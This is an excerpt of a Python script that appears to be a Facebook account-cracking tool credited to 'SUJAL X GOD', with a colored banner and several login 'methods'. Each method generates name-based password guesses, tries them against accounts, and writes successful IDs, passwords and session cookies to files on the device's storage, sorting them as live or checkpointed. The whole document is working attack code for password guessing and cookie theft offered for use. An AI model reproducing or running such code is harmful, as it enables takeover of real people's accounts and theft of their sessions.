...
logo=f"""\033[1;34m
 ...
 |____/ \___/ \___/_/   \_\_____| 
                                        ...
                                        (FREE)             
\033[38;5;46m──────────────────────────────────────────────────
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] AUTHOR    : SUJAL X GOD
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] OWNER     : SUJAL X GOD
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/MRX-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[MRX-CP] {sid} | {ps} ")
                    open('/sdcard/MRX-M1-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self,sid,name,psw):
        try:
            ...
            sys.stdout.write(f"\r\033[38;5;46m[\033[38;5;46mMRX-M2\033[38;5;46m] \033[38;5;46m{loop}\033[38;5;46m \033[38;5;46m|\033[38;5;46m OK\033[38;5;46m|\033[38;5;46mCP \033[38;5;46m{len(oks)}\033[38;5;46m|\033[38;5;46m{len(cps)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r\033[38;5;46m[MRX-LIVE] {sid} | {ps} ")
                    print(f"\r\r\033[38;5;46m[COOKIES-💥]<>{O}{cookie} ")
                    open('/sdcard/MRX-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[MRX-CP] {sid} | {ps} ")
                    open('/sdcard/MRX-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
    ...
    def methodC(self,sid,name,psw):
        try:
            ...
            try:
                ...
                ls = fs
            for pw in psw:
                ps = pw.replace('sujal123',fs.lower()).replace('sujal@123',fs).replace('sujal1122',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())               
                with requests.Session() as session:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);MRXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={MRXb};{ckkk}"
                    print(f"\r\r\033[38;5;46m[SUJAL-LIVE] {sid} | {ps} ")
                    print(f"\r\r\033[38;5;46m[COOKIES-💥]<>{O}{cookie} ")
                    open('/sdcard/MRX-M3-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[SUJAL-CP] {sid} | {ps} ")
                    open('/sdcard/SUJAL-M3-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
    ...
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                print(f"\r\r{M}[sujal-CP] {uid} | {pas} ")
                open('/sdcard/sujal-RNDM-CP.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                cps.append(uid)
            else:     
                continue
        loop+=1
